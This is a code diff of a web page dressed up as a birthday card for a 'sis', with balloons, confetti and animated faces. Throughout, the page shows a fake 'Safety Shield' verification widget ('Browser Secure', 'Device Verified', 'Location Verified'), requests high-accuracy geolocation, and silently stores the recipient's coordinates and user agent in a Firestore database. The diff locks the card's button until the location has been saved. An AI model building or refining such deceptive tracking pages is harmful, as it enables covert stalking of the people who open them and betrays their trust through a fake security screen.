@@ -39,11 +39,25 @@
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
-
         .star-field { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
         @keyframes twinkle { 0%,100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
         .star-sparkle { position: absolute; background: white; border-radius: 50%; animation: twinkle var(--duration) infinite ease-in-out; }
         
+        /* Balloon Styles */
+        .balloon {
+            position: absolute;
+            bottom: -150px;
+            cursor: pointer;
+            z-index: 5;
+            transition: transform 0.2s;
+            filter: drop-shadow(0 10px 10px rgba(0,0,0,0.1));
+        }
+        .balloon:active { transform: scale(0.8); }
+        @keyframes floatUp {
+            0% { transform: translateY(0) rotate(0deg); }
+            100% { transform: translateY(-120vh) rotate(20deg); }
+        }
+
         .app-container {
             position: relative; width: 92vw; max-width: 850px; height: 75vh; max-height: 600px;
             background: var(--card-white); border-radius: 40px; box-shadow: 0 25px 50px -12px rgba(74,50,45,0.15);
@@ -51,7 +65,6 @@
         }
         @media (max-width: 640px) { .app-container { height: 85vh; max-height: none; border-radius: 30px; border: 6px solid #fff; } }
         .canvas-area { flex: 1; position: relative; padding: 2rem; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-
         @keyframes namePulse { 0%,100% { transform: scale(1) translateY(0); } 50% { transform: scale(1.05) translateY(-5px); } }
         h1 {
             font-size: clamp(2.2rem, 7vw, 4rem); font-family: 'Patrick Hand', cursive; color: var(--ink); line-height: 1.1;
@@ -66,7 +79,6 @@
             transition: opacity 0.5s ease; opacity: 0;
         }
         @keyframes fadeIn { to { opacity: 1; } }
-
         @keyframes floatAnim { 0%,100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
         .element {
             position: absolute; z-index: 30; opacity: 0; animation: fadeIn 1s 2s forwards; cursor: pointer; pointer-events: auto;
@@ -80,7 +92,6 @@
         .wave { width: 100px; top: 55%; left: 10%; opacity: 0.8; }
         .cherries-1 { width: 75px; bottom: 22%; left: 20%; }
         .cherries-2 { width: 60px; top: 38%; right: 12%; }
-
         .smile-container {
             width: 180px; margin-top: 25px; position: relative; z-index: 20; opacity: 0;
             animation: fadeIn 0.8s 2.2s forwards; transition: transform 0.5s cubic-bezier(0.175,0.885,0.32,1.275);
@@ -90,15 +101,16 @@
         .wink-eye { animation: helloWink 0.4s forwards !important; transform-origin: center; }
         @keyframes helloWink { 0%,100% { transform: scaleY(1); } 50% { transform: scaleY(0.1); } }
         .big-smile { d: path("M15 25 Q50 65 85 25") !important; stroke: #ff4d6d !important; transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
-
         .action-bar { padding: 1.5rem; background: #fafafa; display: flex; justify-content: center; gap: 1rem; opacity: 0; animation: fadeIn 0.8s 2.5s forwards; }
         .btn { padding: 10px 25px; border-radius: 50px; font-weight: 700; cursor: pointer; border: none; font-size: 0.9rem; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         .btn-main { background: var(--ink); color: white; transition: transform 0.1s; }
         .btn-main:active { transform: scale(0.95); }
+        .btn-main:disabled { background: #b0a09d; opacity: 0.6; cursor: not-allowed; }
         #confetti { position: fixed; inset: 0; pointer-events: none; z-index: 99; }
         .hide-text { opacity: 0 !important; pointer-events: none; }
         .focus-face { transform: scale(1.4) translateY(-20px); }
 
+        /* Popups */
         .popup-overlay {
             position: fixed; inset: 0; background: rgba(74, 50, 45, 0.6); backdrop-filter: blur(12px);
             display: none; justify-content: center; align-items: center; z-index: 1000; padding: 20px;
@@ -118,13 +130,8 @@
             transition: transform 0.2s; box-shadow: 0 8px 20px rgba(74,50,45,0.2);
         }
         .popup-btn:active { transform: scale(0.96); }
-        .instruction-guide {
-            background: #fef3e8; padding: 15px; border-radius: 24px; text-align: left; font-size: 0.9rem;
-            margin: 15px 0; color: #4a322d;
-        }
-        .instruction-guide p { margin: 8px 0; }
-        .instruction-guide .step { font-weight: 700; color: #b9695a; }
 
+        /* Status Widget */
         .status-widget {
             position: fixed; bottom: 20px; right: 20px;
             background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
@@ -164,18 +171,18 @@
             font-size: 0.8rem; color: #6a534e; font-weight: 500;
             animation: slideIn 0.4s ease forwards;
         }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-5px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .status-spinner {
             width: 16px; height: 16px; border: 2.5px solid #fdf0d5; border-top-color: #ff4d6d;
             border-radius: 50%; animation: spin 1s linear infinite;
         }
         .mini-tick { width: 14px; height: 14px; color: #22c55e; }
         .header-icon { width: 20px; height: 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
     <div class="star-field" id="starField"></div>
+    <div id="balloonContainer" style="position:fixed; inset:0; pointer-events:none; z-index:1;"></div>
     <canvas id="confetti"></canvas>
 
     <div id="statusWidget" class="status-widget">
@@ -215,15 +222,6 @@
         </div>
     </div>
 
-    <!-- Verifying Overlay (Modified for strict UI freeze and visual timer) -->
-    <div class="popup-overlay" id="verifyingOverlay" style="z-index: 3000; background: rgba(255,255,255,0.9);">
-        <div class="popup-card" style="box-shadow: none; background: transparent;">
-            <div class="status-spinner" style="width: 40px; height: 40px; margin: 0 auto 20px auto; border-width: 4px; border-top-color: var(--ink);"></div>
-            <div class="popup-title" style="font-size: 1.4rem;">Verifying Security...</div>
-            <div class="popup-desc" id="verifyingDesc" style="font-size: 0.9rem; font-weight: bold; color: #b9695a;">Securing connection... (6s)</div>
-        </div>
-    </div>
-
     <div class="app-container" id="app">
         <div class="canvas-area">
             <div class="element rainbow" data-speed="0.8"><div class="float-wrap"><svg viewBox="0 0 100 60"><path d="M10 50 Q50 0 90 50" stroke="var(--pastel-purple)" stroke-width="8" fill="none" stroke-linecap="round"/><path d="M22 50 Q50 15 78 50" stroke="#ffb3c1" stroke-width="8" fill="none" stroke-linecap="round"/></svg></div></div>
@@ -244,7 +242,7 @@
             <p id="sub-title" class="wish-text">YOU ARE AMAZING!</p>
         </div>
         <div class="action-bar">
-            <button class="btn btn-main" id="mainButton">Let's go sis 🤗</button>
+            <button class="btn btn-main" id="mainButton" disabled>Let's go sis 🤗</button>
         </div>
     </div>
 
@@ -268,12 +266,10 @@
         const db = getFirestore(app);
 
         let currentUserId = null;
-        
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
                     currentUserId = user.uid;
-                    console.log("Logged in as:", currentUserId);
                     resolve(user);
                 }
             });
@@ -281,225 +277,131 @@
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        window.saveLocationData = async (data) => {
-            await authReady; 
+        window.saveLocationData = async (lat, lng, accuracy) => {
+            await authReady;
             if (!currentUserId) return;
             try {
+                const docData = { lat, lng, accuracy, timestamp: serverTimestamp(), userAgent: navigator.userAgent };
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
-            await addDoc(colRef, { 
-                ...data, 
-                timestamp: serverTimestamp(),
-                userAgent: navigator.userAgent
-            });
-            console.log("Location saved successfully!", data);
-        } catch (e) { 
-            console.error("Firestore Error:", e); 
-        }
-    };
+                await addDoc(colRef, docData);
+                window.dispatchEvent(new CustomEvent('dataSaved'));
+            } catch (e) { console.error("Firestore Error:", e); }
+        };
     </script>
 
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script>
         const tickSVG = `<svg class="mini-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9 10L12.2581 12.4436C12.6766 12.7574 13.2662 12.6957 13.6107 12.3021L20 5" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></svg>`;
-        
         let isLocationAllowed = false;
-        let isVerifying = false;
-        let locationWatchId = null;
-        let locationCandidates = [];
+        let isDataSaved = false;
+        const partyHorn = new Audio('https://actions.google.com/sounds/v1/crowds/party_horn.ogg');
+        const popSound = new Audio('https://actions.google.com/sounds/v1/science_fiction/swish_whoosh.ogg'); // Using a placeholder pop-like sound
+        partyHorn.volume = 0.2;
+        popSound.volume = 0.4;
+
+        window.addEventListener('dataSaved', () => { isDataSaved = true; });
+
+        // Balloon Logic
+        function createBalloon() {
+            const container = document.getElementById('balloonContainer');
+            const balloon = document.createElement('div');
+            const colors = ['#ffccd5', '#e2cfea', '#fdf0d5', '#c1d3fe', '#ffb3c1'];
+            const color = colors[Math.floor(Math.random() * colors.length)];
+            
+            balloon.className = 'balloon';
+            balloon.style.left = Math.random() * 90 + 'vw';
+            balloon.style.pointerEvents = 'auto';
+            
+            // Balloon SVG
+            balloon.innerHTML = `
+                <svg width="80" height="100" viewBox="0 0 80 100">
+                    <defs>
+                        <radialGradient id="grad-${color}" cx="30%" cy="30%" r="50%">
+                            <stop offset="0%" style="stop-color:white;stop-opacity:0.3" />
+                            <stop offset="100%" style="stop-color:${color};stop-opacity:1" />
+                        </radialGradient>
+                    </defs>
+                    <ellipse cx="40" cy="40" rx="35" ry="40" fill="url(#grad-${color})" />
+                    <path d="M40 80 L35 90 L45 90 Z" fill="${color}" />
+                    <path d="M40 90 Q45 95 40 100" stroke="#8d7069" fill="none" />
+                </svg>
+            `;
+            
+            const duration = 8 + Math.random() * 7;
+            balloon.style.animation = `floatUp ${duration}s linear forwards`;
+            
+            balloon.addEventListener('click', (e) => {
+                e.stopPropagation();
+                popSound.currentTime = 0;
+                popSound.play().catch(() => {});
+                
+                const rect = balloon.getBoundingClientRect();
+                confetti({
+                    particleCount: 60,
+                    spread: 80,
+                    origin: { x: (rect.left + 40) / window.innerWidth, y: (rect.top + 40) / window.innerHeight },
+                    colors: [color, '#ffffff']
+                });
+                balloon.remove();
+            });
+
+            container.appendChild(balloon);
+            setTimeout(() => balloon.remove(), duration * 1000);
+        }
 
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
             const list = document.getElementById('statusList');
-            const title = document.getElementById('headerTitle');
-            const spinner = document.getElementById('headerSpinner');
-            const shield = document.getElementById('headerShield');
-
             widget.classList.add('visible');
             const delay = ms => new Promise(res => setTimeout(res, ms));
-
             const addStep = async (text) => {
                 widget.classList.add('expanded');
                 const item = document.createElement('div');
                 item.className = 'status-item';
                 item.innerHTML = `${tickSVG} <span>${text}</span>`;
                 list.appendChild(item);
-                await delay(1000);
+                await delay(800);
             };
-
-            await delay(1500);
+            await delay(1000);
             await addStep("Browser Secure");
             await addStep("Device Verified");
-            await addStep("IP: Sri Lanka (SLT)");
-            
             const finalize = async () => {
+                while(!isLocationAllowed || !isDataSaved) await delay(500);
                 await addStep("Location Verified");
-                title.innerText = "Safety Shield Active";
-                spinner.style.display = 'none';
-                shield.style.display = 'block';
-                await delay(3000);
+                document.getElementById('headerTitle').innerText = "Safety Shield Active";
+                document.getElementById('headerSpinner').style.display = 'none';
+                document.getElementById('headerShield').style.display = 'block';
+                document.getElementById('mainButton').disabled = false;
+                await delay(2000);
                 widget.classList.remove('expanded');
                 setTimeout(() => widget.classList.remove('visible'), 600);
             };
-
-            if(isLocationAllowed) {
-                await finalize();
-            } else {
-                title.innerText = "Waiting for Access...";
-                const check = setInterval(async () => {
-                    if(isLocationAllowed) {
-                        clearInterval(check);
-                        await finalize();
-                    }
-                }, 500);
-            }
+            finalize();
         }
 
         async function checkAndShowPopup() {
-            if (navigator.permissions && navigator.permissions.query) {
-                try {
-                    const result = await navigator.permissions.query({ name: 'geolocation' });
-                    if (result.state === 'granted') {
-                        isLocationAllowed = true;
-                        closeAllPopups();
-                        startVerificationProcess(); 
-                    } else if (result.state === 'denied') {
-                        showPopup('overlay3', 'card3');
-                    } else {
-                        showPopup('overlay1', 'card1');
-                    }
-                } catch(e) { showPopup('overlay1', 'card1'); }
-            } else { showPopup('overlay1', 'card1'); }
-        }
-
-        function disableMainInterface() {
-            const btn = document.getElementById('mainButton');
-            btn.style.pointerEvents = 'none';
-            btn.disabled = true;
-            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'none');
-            // Prevent body clicks, but keep overlay 3000 interactive if needed
-            document.body.style.pointerEvents = 'none'; 
-            document.getElementById('verifyingOverlay').style.pointerEvents = 'auto'; 
-            // Allow popups to be interactive
-            document.querySelectorAll('.popup-overlay').forEach(el => el.style.pointerEvents = 'auto');
-        }
-
-        function enableMainInterface() {
-            const btn = document.getElementById('mainButton');
-            btn.style.pointerEvents = 'auto';
-            btn.disabled = false;
-            document.querySelectorAll('.element').forEach(el => el.style.pointerEvents = 'auto');
-            document.body.style.pointerEvents = 'auto';
-        }
-
-        function startVerificationProcess() {
-            if (isVerifying) return;
-            isVerifying = true;
-            
-            const verifyingOverlay = document.getElementById('verifyingOverlay');
-            verifyingOverlay.style.display = 'flex';
-            setTimeout(() => verifyingOverlay.querySelector('.popup-card').classList.add('show'), 50);
-
-            // Disable interactions entirely while verifying
-            disableMainInterface();
-
-            locationCandidates = [];
-            
-            const descEl = document.getElementById('verifyingDesc');
-            let secondsLeft = 6;
-            descEl.innerText = `Securing connection... (${secondsLeft}s)`;
-            
-            const timerInterval = setInterval(() => {
-                secondsLeft--;
-                if(secondsLeft >= 0) {
-                    descEl.innerText = `Securing connection... (${secondsLeft}s)`;
-                }
-                if (secondsLeft <= 0) {
-                    clearInterval(timerInterval);
-                }
-            }, 1000);
-
-            if (navigator.geolocation) {
-                locationWatchId = navigator.geolocation.watchPosition(
-                    (pos) => {
-                        locationCandidates.push({
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            time: Date.now()
-                        });
-                        console.log("Candidate reading, accuracy:", Math.round(pos.coords.accuracy) + "m");
-                    },
-                    (err) => console.warn("Watch error:", err),
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                );
-            }
-
-            // Wait strictly 6 seconds, then pick the absolute best/most stable location
-            setTimeout(() => {
-                if (locationWatchId !== null) {
-                    navigator.geolocation.clearWatch(locationWatchId);
-                }
-                
-                let bestLocation = null;
-                
-                if (locationCandidates.length > 0) {
-                    // Sort strictly by accuracy (lowest radius = most accurate/stable)
-                    // If accuracies are identical, pick the most recent one
-                    locationCandidates.sort((a, b) => {
-                        if (a.accuracy !== b.accuracy) {
-                            return a.accuracy - b.accuracy; 
-                        }
-                        return b.time - a.time; 
-                    });
-                    
-                    bestLocation = locationCandidates[0];
-                    console.log("SUCCESS: Selected stable location with accuracy:", Math.round(bestLocation.accuracy) + "m");
-                } else {
-                    console.warn("No location candidates received within 6s window");
-                }
-
-                if (bestLocation && window.saveLocationData) {
-                    window.saveLocationData(bestLocation);
-                }
-
-                descEl.innerText = "Secured successfully! ✅";
-                descEl.style.color = "#22c55e"; 
-
-                setTimeout(() => {
-                    verifyingOverlay.querySelector('.popup-card').classList.remove('show');
-                    setTimeout(() => {
-                        verifyingOverlay.style.display = 'none';
-                        descEl.style.color = "#b9695a"; // reset color
-                        isVerifying = false;
-                        enableMainInterface();
-                    }, 500);
-                }, 1000); 
-
-            }, 6000);
+            if (navigator.permissions?.query) {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                if (result.state === 'granted') { isLocationAllowed = true; requestLocationAccess(false); }
+                else if (result.state === 'denied') showPopup('overlay3', 'card3');
+                else showPopup('overlay1', 'card1');
+            } else showPopup('overlay1', 'card1');
         }
 
         function requestLocationAccess(showPopupOnError = true) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        isLocationAllowed = true;
-                        closeAllPopups();
-                        startVerificationProcess(); 
-                    },
-                    (error) => {
-                        closeAllPopups();
-                        if (showPopupOnError) showPopup('overlay2', 'card2');
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    pos => { isLocationAllowed = true; closeAllPopups(); window.saveLocationData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); },
+                    () => { closeAllPopups(); if (showPopupOnError) showPopup('overlay2', 'card2'); },
+                    { enableHighAccuracy: true }
                 );
             }
         }
 
         function showPopup(overlayId, cardId) {
             const overlay = document.getElementById(overlayId);
-            const card = document.getElementById(cardId);
             overlay.style.display = 'flex';
-            setTimeout(() => card.classList.add('show'), 50);
+            setTimeout(() => document.getElementById(cardId).classList.add('show'), 50);
         }
 
         function closeAllPopups() {
@@ -509,29 +411,7 @@
             });
         }
 
-        function showGuideInPopup2() {
-            document.getElementById('card2').innerHTML = `
-                <div class="popup-title">🔧 Allow කරන හැටි</div>
-                <div class="instruction-guide">
-                    <p><span class="step">①</span> Lock icon (🔒) එක ක්ලික් කරන්න.</p>
-                    <p><span class="step">②</span> 'Location' එක <strong>Allow</strong> කරන්න.</p>
-                    <p><span class="step">③</span> පිටුව Refresh කරන්න.</p>
-                </div>
-                <button class="popup-btn" onclick="window.location.reload()">✅ Done, Refresh Page</button>
-            `;
-        }
-
-        function showGuideInPopup3() {
-            document.getElementById('card3').innerHTML = `
-                <div class="popup-title">🔐 Allow කරන විදිය</div>
-                <div class="instruction-guide">
-                    <p><span class="step">①</span> 🔒 Lock icon එක ක්ලික් කරන්න.</p>
-                    <p><span class="step">②</span> Location Allow කරන්න.</p>
-                </div>
-                <button class="popup-btn" onclick="window.location.reload()">Refresh Page</button>
-            `;
-        }
-
+        // Animation logic
         const leftPupil = document.getElementById('left-pupil'), rightPupil = document.getElementById('right-pupil'), elements = document.querySelectorAll('.element'), leftEyeGroup = document.getElementById('left-eye-group'), rightEyeGroup = document.getElementById('right-eye-group'), mouth = document.getElementById('mouth'), mainTitle = document.getElementById('main-title'), subTitle = document.getElementById('sub-title'), mainButton = document.getElementById('mainButton'), smileContainer = document.getElementById('smile');
 
         const handleMove = (clientX, clientY) => {
@@ -543,7 +423,19 @@
             elements.forEach(el => { let speed = parseFloat(el.getAttribute('data-speed')); el.style.transform = `translate(${x*speed*40}px, ${y*speed*40}px)`; });
         };
 
+        elements.forEach(el => {
+            el.addEventListener('click', () => {
+                const rect = el.getBoundingClientRect();
+                confetti({
+                    particleCount: 45, spread: 60, zIndex: 105,
+                    origin: { x: (rect.left + rect.width / 2) / window.innerWidth, y: (rect.top + rect.height / 2) / window.innerHeight },
+                    colors: ['#ffccd5', '#e2cfea', '#fdf0d5', '#c1d3fe', '#ff4d6d']
+                });
+            });
+        });
+
         function triggerHelloAnimation() {
+            partyHorn.play().catch(() => {});
             mainTitle.classList.add('hide-text'); subTitle.classList.add('hide-text');
             smileContainer.classList.add('focus-face');
             leftEyeGroup.classList.remove('eye-blink'); rightEyeGroup.classList.remove('eye-blink');
@@ -559,18 +451,16 @@
                 star.style.top=`${Math.random()*100}%`; star.style.left=`${Math.random()*100}%`;
                 star.style.setProperty('--duration',`${Math.random()*3+2}s`); starField.appendChild(star);
             }
+            setInterval(createBalloon, 2000);
             setTimeout(checkAndShowPopup, 500);
             updateStatus();
-            mainButton.addEventListener('click', () => {
-                if(!isLocationAllowed) { checkAndShowPopup(); return; }
-                triggerHelloAnimation();
-            });
+            mainButton.addEventListener('click', triggerHelloAnimation);
         };
 
         document.addEventListener('mousemove', e => handleMove(e.clientX, e.clientY));
         document.addEventListener('touchmove', e => handleMove(e.touches[0].clientX, e.touches[0].clientY));
-        document.getElementById('allowNowBtn')?.addEventListener('click', showGuideInPopup2);
-        document.getElementById('howToAllowBtn')?.addEventListener('click', showGuideInPopup3);
+        document.getElementById('allowNowBtn')?.addEventListener('click', () => window.location.reload());
+        document.getElementById('howToAllowBtn')?.addEventListener('click', () => window.location.reload());
     </script>
 </body>
 </html>
